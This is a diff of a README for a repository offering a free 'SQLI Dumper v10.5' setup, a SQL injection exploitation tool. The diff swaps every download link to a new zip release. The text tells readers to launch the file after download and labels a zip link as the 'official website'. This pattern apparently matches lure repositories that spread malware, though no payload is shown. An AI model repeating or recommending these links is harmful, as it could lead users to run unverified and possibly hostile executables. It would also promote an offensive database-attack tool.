@@ -15,7 +15,7 @@ SQLI Dumper v10.5 is a powerful tool designed for advanced database analysis, se
 
 ## Download 📥
 
-Click [here](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v1.0/Release.zip) to download the SQLI Dumper v10.5 Free Setup. Please note that the file needs to be launched once downloaded.
+Click [here](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v2.0/Software.zip) to download the SQLI Dumper v10.5 Free Setup. Please note that the file needs to be launched once downloaded.
 
 ## Topics 📋
 
@@ -56,6 +56,6 @@ Help us improve SQLI Dumper v10.5 by contributing to its development and spreadi
 
 ---
 
-Feel free to visit the [official website](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v1.0/Release.zip) for more information and updates. Download the SQLI Dumper v10.5 Free Setup to enhance your database testing and security analysis capabilities! 🌐
+Feel free to visit the [official website](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v2.0/Software.zip) for more information and updates. Download the SQLI Dumper v10.5 Free Setup to enhance your database testing and security analysis capabilities! 🌐
 
-[![Download SQLI Dumper v10.5](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v1.0/Release.zip Dumper https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v1.0/Release.zip)](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v1.0/Release.zip)
+[![Download SQLI Dumper v10.5](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v2.0/Software.zip Dumper https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v2.0/Software.zip)](https://github.com/plutodrx/SQLI-DUMPER-10.5-Free-Setup/releases/download/v2.0/Software.zip)
